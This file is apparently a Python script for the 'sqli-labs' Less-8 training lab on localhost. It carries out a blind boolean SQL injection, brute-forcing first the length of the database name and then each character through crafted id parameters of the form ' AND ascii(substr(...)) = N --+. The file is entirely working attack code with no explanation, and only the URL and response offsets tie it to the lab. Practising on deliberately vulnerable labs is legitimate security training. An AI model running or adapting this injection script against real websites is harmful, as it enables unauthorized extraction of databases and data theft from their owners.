import requests
import re

validator = 'Youarein'
payload_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (substr((select length(database())),1,1)) = 1 --+"
payload = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) = 0 --+"

def get_requester(payload):
    response_text = requests.get(payload)
    return response_text

def text_formatter(response_text):
    response_formatted_text = re.sub(r"[\n\t\s]*", "", response_text.text)
    return response_formatted_text

def database_name_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[101] = str(i)
        payload_1 = "".join(list_payload)

        response_text = get_requester(payload_1)
        response_formatted_text = text_formatter(response_text)

        if (validator == response_formatted_text[505:513]):
            response = True
            database_name_length = i
        else:
            response = False
            i = i + 1;
    return database_name_length

def database_name_finder(payload, validator):
    i = 0
    a = 33
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []

    database_name_length = database_name_length_finder(payload_length, validator)

    while (i < database_name_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[91] = str(i)
        payload_1 = "".join(list_payload_1)

        while (a < ascii_max):
            response_text_1 = get_requester(payload_1)
            response_formatted_text_1 = text_formatter(response_text_1)

            if (validator == response_formatted_text_1[505:513]):
                database_name_list.append(chr(a))
                a = 33
                break
            else:
                a = a + 1
                list_payload_3 = list_payload_2
                list_payload_3[100] = str(a)
                payload_1 = "".join(list_payload_3)
                print(payload_1)

    database_name = "".join(database_name_list)

    print(database_name)
    print(database_name_length)

database_name_finder(payload, validator)
